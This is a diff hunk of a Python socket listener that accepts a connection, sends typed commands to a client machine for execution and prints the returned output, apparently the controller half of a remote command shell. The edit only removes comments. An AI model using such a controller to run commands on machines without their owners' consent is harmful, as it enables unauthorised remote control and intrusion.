@@ -12,9 +12,8 @@ connection, address = listener.accept()
 print(f"Connected to {address}")
 
 while True:
-	## continuously send commands to be executed in client machine
-	cmd = input("enter a command: ") # string input	
-	connection.send(bytes(cmd, "utf-8")) # typecasted and converted into bytes
+	cmd = input("enter a command: ")
+	connection.send(bytes(cmd, "utf-8"))
 	
-	output = connection.recv(2048) # receive the output from client machine
-	print(output.decode("utf-8")) # display decoded bytes into string
+	output = connection.recv(2048)
+	print(output.decode("utf-8"))
